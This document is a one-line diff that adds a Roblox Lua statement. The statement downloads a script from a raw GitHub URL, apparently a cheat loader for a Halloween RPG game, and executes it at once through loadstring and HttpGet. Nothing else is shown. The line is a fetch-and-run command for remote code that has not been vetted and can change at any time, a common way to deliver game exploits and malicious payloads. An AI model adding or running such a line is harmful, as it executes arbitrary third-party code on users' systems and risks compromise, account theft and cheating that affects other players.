@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/halloween-hunting-together-rpg-spam7-c3q9v75oob75ng.lua"))()
